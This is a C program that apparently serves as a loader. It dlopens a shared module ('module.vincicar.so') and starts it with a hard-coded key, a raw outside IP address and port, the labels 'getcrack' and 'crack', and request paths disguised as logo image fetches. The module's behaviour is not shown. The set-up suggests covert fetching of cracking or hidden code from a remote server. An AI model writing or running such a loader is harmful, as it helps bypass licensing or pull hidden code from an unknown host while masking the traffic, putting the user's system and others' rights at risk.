#include <dlfcn.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

//gcc -std=c99 loader.vincicar.c -o loader.vincicar -ldl

struct params_t {
  char key[0x100];
  char p1[0x100];
  char p2[0x100];
  char p3[0x100];
  char p4[0x100];
  char p5[0x100];
  char p6[0x100];
  char p7[0x100];
};

typedef int (*am_start_t)(char *directory, unsigned int port, struct params_t *p);

int main() {
    am_start_t am_start = NULL;
    void* lib = NULL;
    char * plugin = "./module.vincicar.so";
    char * function_name = "am_start";
    lib = dlopen(plugin, RTLD_NOW);
    if(!lib) {
        const char* dlopen_error = dlerror();
        printf("failed to open shared library: %s\n", dlopen_error);
        exit(-1);
    }
    am_start = (am_start_t)dlsym(lib, function_name);
    const char* dlsym_error = dlerror();
    if(dlsym_error) {
        printf("Cannot load symbol: %s\n", dlsym_error);
        exit(-1);
    }
    struct params_t params = {
        {0xa2, 0xb0, 0xc8, 0xa5, 0xef, 0x11, 0xf4, 0x12, 0xc2, 0x67, 0x24, 0x4c, 0xb1, 0xbe, 0xc6, 0x15, 0x66, 0x1b, 0xda, 0xde, 0xae, 0x90, 0x36, 0xc1, 0x75, 0x68, 0xb0, 0xa9, 0x64, 0xc5, 0x43, 0x0e}, 
        "/logo.png?token=0&carId=civic&t=1613225437640",
        "getcrack",
        "119.23.181.235",
        "/logo2.png?token=0&carId=civic&agent=official&t=1613225437640",
        "crack",
        "logo3.png?token=0&carId=civic&agent=official&t=1613225437640",
        "logo4.png?token=0&carId=civic&agent=official&t=1613225437640"
    };
    char directory[] = "./";
    am_start(directory, 8099, &params);
}
